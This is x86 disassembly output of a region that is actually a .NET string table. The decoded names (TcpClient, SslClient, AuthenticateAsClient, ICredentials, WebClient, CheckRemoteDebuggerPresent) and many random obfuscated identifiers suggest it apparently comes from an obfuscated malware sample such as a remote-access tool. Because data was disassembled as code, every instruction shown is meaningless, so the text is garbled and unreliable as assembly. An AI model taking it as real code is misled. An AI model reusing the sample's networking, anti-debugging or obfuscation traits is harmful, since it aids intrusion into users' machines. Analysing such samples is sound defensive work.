  4093d4:	52                   	push   %edx
  4093d5:	65 61                	gs popa
  4093d7:	64 41                	fs inc %ecx
  4093d9:	6c                   	insb   (%dx),%es:(%edi)
  4093da:	6c                   	insb   (%dx),%es:(%edi)
  4093db:	42                   	inc    %edx
  4093dc:	79 74                	jns    0x409452
  4093de:	65 73 00             	gs jae 0x4093e1
  4093e1:	47                   	inc    %edi
  4093e2:	65 74 42             	gs je  0x409427
  4093e5:	79 74                	jns    0x40945b
  4093e7:	65 73 00             	gs jae 0x4093ea
  4093ea:	4e                   	dec    %esi
  4093eb:	65 78 74             	gs js  0x409462
  4093ee:	42                   	inc    %edx
  4093ef:	79 74                	jns    0x409465
  4093f1:	65 73 00             	gs jae 0x4093f4
  4093f4:	43                   	inc    %ebx
  4093f5:	53                   	push   %ebx
  4093f6:	68 61 72 70 41       	push   $0x41707261
  4093fb:	72 67                	jb     0x409464
  4093fd:	75 6d                	jne    0x40946c
  4093ff:	65 6e                	outsb  %gs:(%esi),(%dx)
  409401:	74 49                	je     0x40944c
  409403:	6e                   	outsb  %ds:(%esi),(%dx)
  409404:	66 6f                	outsw  %ds:(%esi),(%dx)
  409406:	46                   	inc    %esi
  409407:	6c                   	insb   (%dx),%es:(%edi)
  409408:	61                   	popa
  409409:	67 73 00             	addr16 jae 0x40940c
  40940c:	43                   	inc    %ebx
  40940d:	53                   	push   %ebx
  40940e:	68 61 72 70 42       	push   $0x42707261
  409413:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  40941a:	61                   	popa
  40941b:	67 73 00             	addr16 jae 0x40941e
  40941e:	53                   	push   %ebx
  40941f:	74 72                	je     0x409493
  409421:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  409428:	73 73                	jae    0x40949d
  40942a:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409431:	6e                   	outsb  %ds:(%esi),(%dx)
  409432:	67 45                	addr16 inc %ebp
  409434:	76 65                	jbe    0x40949b
  409436:	6e                   	outsb  %ds:(%esi),(%dx)
  409437:	74 41                	je     0x40947a
  409439:	72 67                	jb     0x4094a2
  40943b:	73 00                	jae    0x40943d
  40943d:	49                   	dec    %ecx
  40943e:	43                   	inc    %ebx
  40943f:	72 65                	jb     0x4094a6
  409441:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409444:	74 69                	je     0x4094af
  409446:	61                   	popa
  409447:	6c                   	insb   (%dx),%es:(%edi)
  409448:	73 00                	jae    0x40944a
  40944a:	73 65                	jae    0x4094b1
  40944c:	74 5f                	je     0x4094ad
  40944e:	43                   	inc    %ebx
  40944f:	72 65                	jb     0x4094b6
  409451:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409454:	74 69                	je     0x4094bf
  409456:	61                   	popa
  409457:	6c                   	insb   (%dx),%es:(%edi)
  409458:	73 00                	jae    0x40945a
  40945a:	45                   	inc    %ebp
  40945b:	71 75                	jno    0x4094d2
  40945d:	61                   	popa
  40945e:	6c                   	insb   (%dx),%es:(%edi)
  40945f:	73 00                	jae    0x409461
  409461:	53                   	push   %ebx
  409462:	73 6c                	jae    0x4094d0
  409464:	50                   	push   %eax
  409465:	72 6f                	jb     0x4094d6
  409467:	74 6f                	je     0x4094d8
  409469:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40946c:	73 00                	jae    0x40946e
  40946e:	53                   	push   %ebx
  40946f:	79 73                	jns    0x4094e4
  409471:	74 65                	je     0x4094d8
  409473:	6d                   	insl   (%dx),%es:(%edi)
  409474:	2e 57                	cs push %edi
  409476:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  40947d:	46                   	inc    %esi
  40947e:	6f                   	outsl  %ds:(%esi),(%dx)
  40947f:	72 6d                	jb     0x4094ee
  409481:	73 00                	jae    0x409483
  409483:	44                   	inc    %esp
  409484:	6e                   	outsb  %ds:(%esi),(%dx)
  409485:	73 00                	jae    0x409487
  409487:	43                   	inc    %ebx
  409488:	6f                   	outsl  %ds:(%esi),(%dx)
  409489:	6e                   	outsb  %ds:(%esi),(%dx)
  40948a:	74 61                	je     0x4094ed
  40948c:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409493:	74 65                	je     0x4094fa
  409495:	6d                   	insl   (%dx),%es:(%edi)
  409496:	2e 43                	cs inc %ebx
  409498:	6f                   	outsl  %ds:(%esi),(%dx)
  409499:	6c                   	insb   (%dx),%es:(%edi)
  40949a:	6c                   	insb   (%dx),%es:(%edi)
  40949b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4094a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4094a1:	73 00                	jae    0x4094a3
  4094a3:	53                   	push   %ebx
  4094a4:	74 72                	je     0x409518
  4094a6:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  4094ad:	74 4f                	je     0x4094fe
  4094af:	70 74                	jo     0x409525
  4094b1:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  4094b8:	74 49                	je     0x409503
  4094ba:	6d                   	insl   (%dx),%es:(%edi)
  4094bb:	61                   	popa
  4094bc:	67 65 44             	addr16 gs inc %esp
  4094bf:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  4094c3:	65 72 73             	gs jb  0x409539
  4094c6:	00 52 75             	add    %dl,0x75(%edx)
  4094c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4094ca:	74 69                	je     0x409535
  4094cc:	6d                   	insl   (%dx),%es:(%edi)
  4094cd:	65 48                	gs dec %eax
  4094cf:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d1:	70 65                	jo     0x409538
  4094d3:	72 73                	jb     0x409548
  4094d5:	00 53 73             	add    %dl,0x73(%ebx)
  4094d8:	6c                   	insb   (%dx),%es:(%edi)
  4094d9:	50                   	push   %eax
  4094da:	6f                   	outsl  %ds:(%esi),(%dx)
  4094db:	6c                   	insb   (%dx),%es:(%edi)
  4094dc:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  4094e3:	72 73                	jb     0x409558
  4094e5:	00 46 69             	add    %al,0x69(%esi)
  4094e8:	6c                   	insb   (%dx),%es:(%edi)
  4094e9:	65 41                	gs inc %ecx
  4094eb:	63 63 65             	arpl   %esp,0x65(%ebx)
  4094ee:	73 73                	jae    0x409563
  4094f0:	00 47 65             	add    %al,0x65(%edi)
  4094f3:	74 43                	je     0x409538
  4094f5:	75 72                	jne    0x409569
  4094f7:	72 65                	jb     0x40955e
  4094f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4094fa:	74 50                	je     0x40954c
  4094fc:	72 6f                	jb     0x40956d
  4094fe:	63 65 73             	arpl   %esp,0x73(%ebp)
  409501:	73 00                	jae    0x409503
  409503:	49                   	dec    %ecx
  409504:	50                   	push   %eax
  409505:	41                   	inc    %ecx
  409506:	64 64 72 65          	fs fs jb 0x40956f
  40950a:	73 73                	jae    0x40957f
  40950c:	00 53 79             	add    %dl,0x79(%ebx)
  40950f:	73 74                	jae    0x409585
  409511:	65 6d                	gs insl (%dx),%es:(%edi)
  409513:	2e 4e                	cs dec %esi
  409515:	65 74 2e             	gs je  0x409546
  409518:	53                   	push   %ebx
  409519:	6f                   	outsl  %ds:(%esi),(%dx)
  40951a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40951d:	74 73                	je     0x409592
  40951f:	00 73 65             	add    %dh,0x65(%ebx)
  409522:	74 5f                	je     0x409583
  409524:	41                   	inc    %ecx
  409525:	72 67                	jb     0x40958e
  409527:	75 6d                	jne    0x409596
  409529:	65 6e                	outsb  %gs:(%esi),(%dx)
  40952b:	74 73                	je     0x4095a0
  40952d:	00 53 79             	add    %dl,0x79(%ebx)
  409530:	73 74                	jae    0x4095a6
  409532:	65 6d                	gs insl (%dx),%es:(%edi)
  409534:	45                   	inc    %ebp
  409535:	76 65                	jbe    0x40959c
  409537:	6e                   	outsb  %ds:(%esi),(%dx)
  409538:	74 73                	je     0x4095ad
  40953a:	00 45 78             	add    %al,0x78(%ebp)
  40953d:	69 73 74 73 00 41 4c 	imul   $0x4c410073,0x74(%ebx),%esi
  409544:	67 6e                	outsb  %ds:(%si),(%dx)
  409546:	77 63                	ja     0x4095ab
  409548:	50                   	push   %eax
  409549:	59                   	pop    %ecx
  40954a:	6d                   	insl   (%dx),%es:(%edi)
  40954b:	61                   	popa
  40954c:	66 46                	inc    %si
  40954e:	65 77 5a             	gs ja  0x4095ab
  409551:	74 00                	je     0x409553
  409553:	43                   	inc    %ebx
  409554:	6f                   	outsl  %ds:(%esi),(%dx)
  409555:	6e                   	outsb  %ds:(%esi),(%dx)
  409556:	63 61 74             	arpl   %esp,0x74(%ecx)
  409559:	00 49 6d             	add    %cl,0x6d(%ecx)
  40955c:	61                   	popa
  40955d:	67 65 46             	addr16 gs inc %esi
  409560:	6f                   	outsl  %ds:(%esi),(%dx)
  409561:	72 6d                	jb     0x4095d0
  409563:	61                   	popa
  409564:	74 00                	je     0x409566
  409566:	67 65 74 5f          	addr16 gs je 0x4095c9
  40956a:	41                   	inc    %ecx
  40956b:	73 46                	jae    0x4095b3
  40956d:	6c                   	insb   (%dx),%es:(%edi)
  40956e:	6f                   	outsl  %ds:(%esi),(%dx)
  40956f:	61                   	popa
  409570:	74 00                	je     0x409572
  409572:	73 65                	jae    0x4095d9
  409574:	74 5f                	je     0x4095d5
  409576:	41                   	inc    %ecx
  409577:	73 46                	jae    0x4095bf
  409579:	6c                   	insb   (%dx),%es:(%edi)
  40957a:	6f                   	outsl  %ds:(%esi),(%dx)
  40957b:	61                   	popa
  40957c:	74 00                	je     0x40957e
  40957e:	4d                   	dec    %ebp
  40957f:	61                   	popa
  409580:	6e                   	outsb  %ds:(%esi),(%dx)
  409581:	61                   	popa
  409582:	67 65 6d             	gs insl (%dx),%es:(%di)
  409585:	65 6e                	outsb  %gs:(%esi),(%dx)
  409587:	74 42                	je     0x4095cb
  409589:	61                   	popa
  40958a:	73 65                	jae    0x4095f1
  40958c:	4f                   	dec    %edi
  40958d:	62 6a 65             	bound  %ebp,0x65(%edx)
  409590:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409594:	6f                   	outsl  %ds:(%esi),(%dx)
  409595:	6c                   	insb   (%dx),%es:(%edi)
  409596:	6c                   	insb   (%dx),%es:(%edi)
  409597:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40959c:	6f                   	outsl  %ds:(%esi),(%dx)
  40959d:	6e                   	outsb  %ds:(%esi),(%dx)
  40959e:	6e                   	outsb  %ds:(%esi),(%dx)
  40959f:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  4095a4:	65 74 00             	gs je  0x4095a7
  4095a7:	53                   	push   %ebx
  4095a8:	79 73                	jns    0x40961d
  4095aa:	74 65                	je     0x409611
  4095ac:	6d                   	insl   (%dx),%es:(%edi)
  4095ad:	2e 4e                	cs dec %esi
  4095af:	65 74 00             	gs je  0x4095b2
  4095b2:	54                   	push   %esp
  4095b3:	61                   	popa
  4095b4:	72 67                	jb     0x40961d
  4095b6:	65 74 00             	gs je  0x4095b9
  4095b9:	53                   	push   %ebx
  4095ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4095bb:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4095be:	74 00                	je     0x4095c0
  4095c0:	53                   	push   %ebx
  4095c1:	79 73                	jns    0x409636
  4095c3:	74 65                	je     0x40962a
  4095c5:	6d                   	insl   (%dx),%es:(%edi)
  4095c6:	2e 43                	cs inc %ebx
  4095c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c9:	6c                   	insb   (%dx),%es:(%edi)
  4095ca:	6c                   	insb   (%dx),%es:(%edi)
  4095cb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4095d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4095d1:	73 2e                	jae    0x409601
  4095d3:	49                   	dec    %ecx
  4095d4:	45                   	inc    %ebp
  4095d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4095d6:	75 6d                	jne    0x409645
  4095d8:	65 72 61             	gs jb  0x40963c
  4095db:	74 6f                	je     0x40964c
  4095dd:	72 2e                	jb     0x40960d
  4095df:	52                   	push   %edx
  4095e0:	65 73 65             	gs jae 0x409648
  4095e3:	74 00                	je     0x4095e5
  4095e5:	67 65 74 5f          	addr16 gs je 0x409648
  4095e9:	4f                   	dec    %edi
  4095ea:	66 66 73 65          	data16 data16 jae 0x409653
  4095ee:	74 00                	je     0x4095f0
  4095f0:	73 65                	jae    0x409657
  4095f2:	74 5f                	je     0x409653
  4095f4:	4f                   	dec    %edi
  4095f5:	66 66 73 65          	data16 data16 jae 0x40965e
  4095f9:	74 00                	je     0x4095fb
  4095fb:	53                   	push   %ebx
  4095fc:	70 6c                	jo     0x40966a
  4095fe:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  409605:	00 
  409606:	53                   	push   %ebx
  409607:	69 6e 67 6c 65 4f 72 	imul   $0x724f656c,0x67(%esi),%ebp
  40960e:	44                   	inc    %esp
  40960f:	65 66 61             	gs popaw
  409612:	75 6c                	jne    0x409680
  409614:	74 00                	je     0x409616
  409616:	49                   	dec    %ecx
  409617:	41                   	inc    %ecx
  409618:	73 79                	jae    0x409693
  40961a:	6e                   	outsb  %ds:(%esi),(%dx)
  40961b:	63 52 65             	arpl   %edx,0x65(%edx)
  40961e:	73 75                	jae    0x409695
  409620:	6c                   	insb   (%dx),%es:(%edi)
  409621:	74 00                	je     0x409623
  409623:	54                   	push   %esp
  409624:	6f                   	outsl  %ds:(%esi),(%dx)
  409625:	55                   	push   %ebp
  409626:	70 70                	jo     0x409698
  409628:	65 72 49             	gs jb  0x409674
  40962b:	6e                   	outsb  %ds:(%esi),(%dx)
  40962c:	76 61                	jbe    0x40968f
  40962e:	72 69                	jb     0x409699
  409630:	61                   	popa
  409631:	6e                   	outsb  %ds:(%esi),(%dx)
  409632:	74 00                	je     0x409634
  409634:	57                   	push   %edi
  409635:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409639:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409640:	74 5f                	je     0x4096a1
  409642:	53                   	push   %ebx
  409643:	73 6c                	jae    0x4096b1
  409645:	43                   	inc    %ebx
  409646:	6c                   	insb   (%dx),%es:(%edi)
  409647:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40964e:	74 5f                	je     0x4096af
  409650:	53                   	push   %ebx
  409651:	73 6c                	jae    0x4096bf
  409653:	43                   	inc    %ebx
  409654:	6c                   	insb   (%dx),%es:(%edi)
  409655:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40965c:	74 5f                	je     0x4096bd
  40965e:	54                   	push   %esp
  40965f:	63 70 43             	arpl   %esi,0x43(%eax)
  409662:	6c                   	insb   (%dx),%es:(%edi)
  409663:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40966a:	74 5f                	je     0x4096cb
  40966c:	54                   	push   %esp
  40966d:	63 70 43             	arpl   %esi,0x43(%eax)
  409670:	6c                   	insb   (%dx),%es:(%edi)
  409671:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409678:	74 68                	je     0x4096e2
  40967a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40967c:	74 69                	je     0x4096e7
  40967e:	63 61 74             	arpl   %esp,0x74(%ecx)
  409681:	65 41                	gs inc %ecx
  409683:	73 43                	jae    0x4096c8
  409685:	6c                   	insb   (%dx),%es:(%edi)
  409686:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  40968d:	73 74                	jae    0x409703
  40968f:	65 6d                	gs insl (%dx),%es:(%edi)
  409691:	2e 4d                	cs dec %ebp
  409693:	61                   	popa
  409694:	6e                   	outsb  %ds:(%esi),(%dx)
  409695:	61                   	popa
  409696:	67 65 6d             	gs insl (%dx),%es:(%di)
  409699:	65 6e                	outsb  %gs:(%esi),(%dx)
  40969b:	74 00                	je     0x40969d
  40969d:	45                   	inc    %ebp
  40969e:	6e                   	outsb  %ds:(%esi),(%dx)
  40969f:	76 69                	jbe    0x40970a
  4096a1:	72 6f                	jb     0x409712
  4096a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4096a4:	6d                   	insl   (%dx),%es:(%edi)
  4096a5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4096a7:	74 00                	je     0x4096a9
  4096a9:	53                   	push   %ebx
  4096aa:	79 73                	jns    0x40971f
  4096ac:	74 65                	je     0x409713
  4096ae:	6d                   	insl   (%dx),%es:(%edi)
  4096af:	2e 43                	cs inc %ebx
  4096b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4096b2:	6c                   	insb   (%dx),%es:(%edi)
  4096b3:	6c                   	insb   (%dx),%es:(%edi)
  4096b4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4096b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ba:	73 2e                	jae    0x4096ea
  4096bc:	49                   	dec    %ecx
  4096bd:	45                   	inc    %ebp
  4096be:	6e                   	outsb  %ds:(%esi),(%dx)
  4096bf:	75 6d                	jne    0x40972e
  4096c1:	65 72 61             	gs jb  0x409725
  4096c4:	74 6f                	je     0x409735
  4096c6:	72 2e                	jb     0x4096f6
  4096c8:	67 65 74 5f          	addr16 gs je 0x40972b
  4096cc:	43                   	inc    %ebx
  4096cd:	75 72                	jne    0x409741
  4096cf:	72 65                	jb     0x409736
  4096d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4096d2:	74 00                	je     0x4096d4
  4096d4:	47                   	inc    %edi
  4096d5:	65 74 43             	gs je  0x40971b
  4096d8:	75 72                	jne    0x40974c
  4096da:	72 65                	jb     0x409741
  4096dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4096dd:	74 00                	je     0x4096df
  4096df:	43                   	inc    %ebx
  4096e0:	68 65 63 6b 52       	push   $0x526b6365
  4096e5:	65 6d                	gs insl (%dx),%es:(%edi)
  4096e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4096e8:	74 65                	je     0x40974f
  4096ea:	44                   	inc    %esp
  4096eb:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4096ef:	67 65 72 50          	addr16 gs jb 0x409743
  4096f3:	72 65                	jb     0x40975a
  4096f5:	73 65                	jae    0x40975c
  4096f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4096f8:	74 00                	je     0x4096fa
  4096fa:	67 65 74 5f          	addr16 gs je 0x40975d
  4096fe:	52                   	push   %edx
  4096ff:	65 6d                	gs insl (%dx),%es:(%edi)
  409701:	6f                   	outsl  %ds:(%esi),(%dx)
  409702:	74 65                	je     0x409769
  409704:	45                   	inc    %ebp
  409705:	6e                   	outsb  %ds:(%esi),(%dx)
  409706:	64 50                	fs push %eax
  409708:	6f                   	outsl  %ds:(%esi),(%dx)
  409709:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409710:	5f                   	pop    %edi
  409711:	43                   	inc    %ebx
  409712:	6f                   	outsl  %ds:(%esi),(%dx)
  409713:	75 6e                	jne    0x409783
  409715:	74 00                	je     0x409717
  409717:	67 65 74 5f          	addr16 gs je 0x40977a
  40971b:	50                   	push   %eax
  40971c:	72 6f                	jb     0x40978d
  40971e:	63 65 73             	arpl   %esp,0x73(%ebp)
  409721:	73 6f                	jae    0x409792
  409723:	72 43                	jb     0x409768
  409725:	6f                   	outsl  %ds:(%esi),(%dx)
  409726:	75 6e                	jne    0x409796
  409728:	74 00                	je     0x40972a
  40972a:	47                   	inc    %edi
  40972b:	65 74 50             	gs je  0x40977e
  40972e:	61                   	popa
  40972f:	74 68                	je     0x409799
  409731:	52                   	push   %edx
  409732:	6f                   	outsl  %ds:(%esi),(%dx)
  409733:	6f                   	outsl  %ds:(%esi),(%dx)
  409734:	74 00                	je     0x409736
  409736:	6a 78                	push   $0x78
  409738:	68 70 47 73 66       	push   $0x66734770
  40973d:	5a                   	pop    %edx
  40973e:	72 74                	jb     0x4097b4
  409740:	00 50 61             	add    %dl,0x61(%eax)
  409743:	72 61                	jb     0x4097a6
  409745:	6d                   	insl   (%dx),%es:(%edi)
  409746:	65 74 65             	gs je  0x4097ae
  409749:	72 69                	jb     0x4097b4
  40974b:	7a 65                	jp     0x4097b2
  40974d:	64 54                	fs push %esp
  40974f:	68 72 65 61 64       	push   $0x64616572
  409754:	53                   	push   %ebx
  409755:	74 61                	je     0x4097b8
  409757:	72 74                	jb     0x4097cd
  409759:	00 43 6f             	add    %al,0x6f(%ebx)
  40975c:	6e                   	outsb  %ds:(%esi),(%dx)
  40975d:	76 65                	jbe    0x4097c4
  40975f:	72 74                	jb     0x4097d5
  409761:	00 43 61             	add    %al,0x61(%ebx)
  409764:	73 74                	jae    0x4097da
  409766:	00 46 61             	add    %al,0x61(%esi)
  409769:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409770:	54 
  409771:	6f                   	outsl  %ds:(%esi),(%dx)
  409772:	4c                   	dec    %esp
  409773:	69 73 74 00 76 62 66 	imul   $0x66627600,0x74(%ebx),%esi
  40977a:	71 52                	jno    0x4097ce
  40977c:	73 59                	jae    0x4097d7
  40977e:	6c                   	insb   (%dx),%es:(%edi)
  40977f:	47                   	inc    %edi
  409780:	6a 73                	push   $0x73
  409782:	74 00                	je     0x409784
  409784:	6d                   	insl   (%dx),%es:(%edi)
  409785:	4e                   	dec    %esi
  409786:	52                   	push   %edx
  409787:	62 6e 55             	bound  %ebp,0x55(%esi)
  40978a:	58                   	pop    %eax
  40978b:	6a 54                	push   $0x54
  40978d:	75 74                	jne    0x409803
  40978f:	00 53 79             	add    %dl,0x79(%ebx)
  409792:	73 74                	jae    0x409808
  409794:	65 6d                	gs insl (%dx),%es:(%edi)
  409796:	2e 43                	cs inc %ebx
  409798:	6f                   	outsl  %ds:(%esi),(%dx)
  409799:	6c                   	insb   (%dx),%es:(%edi)
  40979a:	6c                   	insb   (%dx),%es:(%edi)
  40979b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4097a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4097a1:	73 2e                	jae    0x4097d1
  4097a3:	49                   	dec    %ecx
  4097a4:	45                   	inc    %ebp
  4097a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4097a6:	75 6d                	jne    0x409815
  4097a8:	65 72 61             	gs jb  0x40980c
  4097ab:	74 6f                	je     0x40981c
  4097ad:	72 2e                	jb     0x4097dd
  4097af:	4d                   	dec    %ebp
  4097b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4097b1:	76 65                	jbe    0x409818
  4097b3:	4e                   	dec    %esi
  4097b4:	65 78 74             	gs js  0x40982b
  4097b7:	00 53 79             	add    %dl,0x79(%ebx)
  4097ba:	73 74                	jae    0x409830
  4097bc:	65 6d                	gs insl (%dx),%es:(%edi)
  4097be:	2e 54                	cs push %esp
  4097c0:	65 78 74             	gs js  0x409837
  4097c3:	00 4e 62             	add    %cl,0x62(%esi)
  4097c6:	4e                   	dec    %esi
  4097c7:	4b                   	dec    %ebx
  4097c8:	7a 51                	jp     0x40981b
  4097ca:	7a 44                	jp     0x409810
  4097cc:	48                   	dec    %eax
  4097cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4097ce:	74 62                	je     0x409832
  4097d0:	74 7a                	je     0x40984c
  4097d2:	74 00                	je     0x4097d4
  4097d4:	59                   	pop    %ecx
  4097d5:	6b 72 58 77          	imul   $0x77,0x58(%edx),%esi
  4097d9:	59                   	pop    %ecx
  4097da:	7a 65                	jp     0x409841
  4097dc:	54                   	push   %esp
  4097dd:	72 73                	jb     0x409852
  4097df:	49                   	dec    %ecx
  4097e0:	75 00                	jne    0x4097e2
  4097e2:	7a 75                	jp     0x409859
  4097e4:	75 4d                	jne    0x409833
  4097e6:	4b                   	dec    %ebx
  4097e7:	64 73 6a             	fs jae 0x409854
  4097ea:	6d                   	insl   (%dx),%es:(%edi)
  4097eb:	71 4d                	jno    0x40983a
  4097ed:	75 00                	jne    0x4097ef
  4097ef:	49                   	dec    %ecx
  4097f0:	70 56                	jo     0x409848
  4097f2:	4b                   	dec    %ebx
  4097f3:	79 56                	jns    0x40984b
  4097f5:	54                   	push   %esp
  4097f6:	7a 43                	jp     0x40983b
  4097f8:	54                   	push   %esp
  4097f9:	6d                   	insl   (%dx),%es:(%edi)
  4097fa:	4e                   	dec    %esi
  4097fb:	75 00                	jne    0x4097fd
  4097fd:	4d                   	dec    %ebp
  4097fe:	77 6e                	ja     0x40986e
  409800:	74 77                	je     0x409879
  409802:	59                   	pop    %ecx
  409803:	74 55                	je     0x40985a
  409805:	53                   	push   %ebx
  409806:	52                   	push   %edx
  409807:	75 00                	jne    0x409809
  409809:	66 6c                	data16 insb (%dx),%es:(%edi)
  40980b:	45                   	inc    %ebp
  40980c:	4d                   	dec    %ebp
  40980d:	6e                   	outsb  %ds:(%esi),(%dx)
  40980e:	72 6e                	jb     0x40987e
  409810:	52                   	push   %edx
  409811:	42                   	inc    %edx
  409812:	79 53                	jns    0x409867
  409814:	75 00                	jne    0x409816
  409816:	7a 55                	jp     0x40986d
  409818:	6f                   	outsl  %ds:(%esi),(%dx)
  409819:	41                   	inc    %ecx
  40981a:	4a                   	dec    %edx
  40981b:	67 77 69             	addr16 ja 0x409887
  40981e:	58                   	pop    %eax
  40981f:	44                   	inc    %esp
  409820:	73 66                	jae    0x409888
  409822:	79 56                	jns    0x40987a
  409824:	75 00                	jne    0x409826
  409826:	78 66                	js     0x40988e
  409828:	75 67                	jne    0x409891
  40982a:	4a                   	dec    %edx
  40982b:	6d                   	insl   (%dx),%es:(%edi)
  40982c:	45                   	inc    %ebp
  40982d:	66 4a                	dec    %dx
  40982f:	6d                   	insl   (%dx),%es:(%edi)
  409830:	62 47 65             	bound  %eax,0x65(%edi)
  409833:	75 00                	jne    0x409835
  409835:	55                   	push   %ebp
  409836:	53                   	push   %ebx
  409837:	61                   	popa
  409838:	41                   	inc    %ecx
  409839:	78 53                	js     0x40988e
  40983b:	6c                   	insb   (%dx),%es:(%edi)
  40983c:	62 6c 4f 6b          	bound  %ebp,0x6b(%edi,%ecx,2)
  409840:	68 75 00 49 49       	push   $0x49490075
  409845:	69 65 48 6e 66 70 6d 	imul   $0x6d70666e,0x48(%ebp),%esp
  40984c:	54                   	push   %esp
  40984d:	54                   	push   %esp
  40984e:	6c                   	insb   (%dx),%es:(%edi)
  40984f:	75 00                	jne    0x409851
  409851:	72 48                	jb     0x40989b
  409853:	75 56                	jne    0x4098ab
  409855:	6e                   	outsb  %ds:(%esi),(%dx)
  409856:	74 79                	je     0x4098d1
  409858:	6e                   	outsb  %ds:(%esi),(%dx)
  409859:	6e                   	outsb  %ds:(%esi),(%dx)
  40985a:	5a                   	pop    %edx
  40985b:	6d                   	insl   (%dx),%es:(%edi)
  40985c:	75 00                	jne    0x40985e
  40985e:	46                   	inc    %esi
  40985f:	64 68 72 4f 71 70    	fs push $0x70714f72
  409865:	50                   	push   %eax
  409866:	61                   	popa
  409867:	71 75                	jno    0x4098de
  409869:	00 47 71             	add    %al,0x71(%edi)
  40986c:	53                   	push   %ebx
  40986d:	76 59                	jbe    0x4098c8
  40986f:	72 48                	jb     0x4098b9
  409871:	4c                   	dec    %esp
  409872:	46                   	inc    %esi
  409873:	79 75                	jns    0x4098ea
  409875:	00 75 68             	add    %dh,0x68(%ebp)
  409878:	74 56                	je     0x4098d0
  40987a:	54                   	push   %esp
  40987b:	67 49                	addr16 dec %ecx
  40987d:	48                   	dec    %eax
  40987e:	41                   	inc    %ecx
  40987f:	6e                   	outsb  %ds:(%esi),(%dx)
  409880:	4f                   	dec    %edi
  409881:	76 00                	jbe    0x409883
  409883:	42                   	inc    %edx
  409884:	49                   	dec    %ecx
  409885:	62 5a 70             	bound  %ebx,0x70(%edx)
  409888:	69 69 53 68 57 59 5a 	imul   $0x5a595768,0x53(%ecx),%ebp
  40988f:	76 00                	jbe    0x409891
  409891:	78 65                	js     0x4098f8
  409893:	77 75                	ja     0x40990a
  409895:	43                   	inc    %ebx
  409896:	74 6b                	je     0x409903
  409898:	6f                   	outsl  %ds:(%esi),(%dx)
  409899:	53                   	push   %ebx
  40989a:	63 6d 76             	arpl   %ebp,0x76(%ebp)
  40989d:	00 70 7a             	add    %dh,0x7a(%eax)
  4098a0:	42                   	inc    %edx
  4098a1:	53                   	push   %ebx
  4098a2:	63 50 4f             	arpl   %edx,0x4f(%eax)
  4098a5:	48                   	dec    %eax
  4098a6:	7a 79                	jp     0x409921
  4098a8:	77 76                	ja     0x409920
  4098aa:	00 54 51 68          	add    %dl,0x68(%ecx,%edx,2)
  4098ae:	66 69 4d 4d 44 68    	imul   $0x6844,0x4d(%ebp),%cx
  4098b4:	67 50                	addr16 push %eax
  4098b6:	43                   	inc    %ebx
  4098b7:	77 00                	ja     0x4098b9
  4098b9:	4a                   	dec    %edx
  4098ba:	74 79                	je     0x409935
  4098bc:	70 6a                	jo     0x409928
  4098be:	59                   	pop    %ecx
  4098bf:	41                   	inc    %ecx
  4098c0:	4d                   	dec    %ebp
  4098c1:	4f                   	dec    %edi
  4098c2:	68 52 6f 4c 77       	push   $0x774c6f52
  4098c7:	00 76 44             	add    %dh,0x44(%esi)
  4098ca:	45                   	inc    %ebp
